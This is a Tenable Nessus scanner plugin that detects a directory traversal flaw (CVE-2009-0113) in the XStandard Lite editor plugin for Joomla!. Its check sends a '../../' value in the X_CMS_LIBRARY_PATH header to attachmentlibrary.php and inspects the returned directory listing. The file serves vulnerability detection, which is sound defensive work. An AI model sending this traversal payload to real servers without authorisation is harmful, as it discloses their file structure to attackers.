#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35321);
  script_version("$Revision: 1.18 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2009-0113");
  script_bugtraq_id(33143);
  script_osvdb_id(51172);
  script_xref(name:"EDB-ID", value:"7691");
  script_xref(name:"Secunia", value:"33377");

  script_name(english:"XStandard Lite Plugin for Joomla! X_CMS_LIBRARY_PATH Header Directory Traversal");
  script_summary(english:"Attempts to list contents of top-level Joomla! directory.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
an information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Joomla! running on the remote host is distributed with
a WYSIWYG editor plugin known as XStandard Lite. This plugin is
affected by an information disclosure vulnerability in the
attachmentlibrary.php script due to improper sanitization of
user-supplied input to the X_CMS_LIBRARY_PATH request header before
returning a listing of directories and certain types of files (txt,
zip, pdf, doc, rtf, tar, ppt, xls, xml, xsl, xslt, swf, gif, jpeg,
jpg, png, and bmp by default). Regardless of whether this plugin has
been configured for use with the Joomla! installation, an
unauthenticated, remote attacker can exploit this vulnerability, via a
specially crafted directory traversal sequence, to disclose the
directory trees on the remote host, subject to the privileges of the
web server user ID.");
  # https://www.joomla.org/announcements/release-news/5226-joomla-159-security-release-now-available.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?11fb9abc");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 1.5.9 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date",value:"2009/01/07");
  script_set_attribute(attribute:"patch_publication_date",value:"2009/01/10");
  script_set_attribute(attribute:"plugin_publication_date",value:"2009/01/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Target directory (relative to Joomla's 'images/stories' directory).
target_dir = "../../";

# Try to exploit the issue to get a list of directories under target_dir.
url ="/plugins/editors/xstandard/attachmentlibrary.php";

res = http_send_recv3(
  method      : "GET",
  port        : port,
  item        : dir + url,
  add_headers : make_array("X_CMS_LIBRARY_PATH", target_dir),
  exit_on_fail : TRUE
);

if (
  '<library><containers><container><objectName>' >< res[2] &&
  '<path>' +target_dir+ '</path>' >< res[2] ||
  (
    '/administrator/</baseURL>' >< res[2] ||
    '/components/</baseURL>' >< res[2]
  )
)
{
  info = res[2];
  info = ereg_replace(pattern:"><(/?library)>", replace:'>\n  <\\1>', string:info);
  info = ereg_replace(pattern:"><(/?containers)>", replace:'>\n  <\\1>', string:info);
  info = ereg_replace(pattern:"><(container)>", replace:'>\n    <\\1>', string:info);
  info = ereg_replace(pattern:"><(/container)>", replace:'>\n    <\\1>', string:info);
  info = ereg_replace(pattern:"><([^>]+)>", replace:'>\n      <\\1>', string:info);

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    generic     : TRUE,
    request     : make_list(http_last_sent_request()),
    output      : chomp(info)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
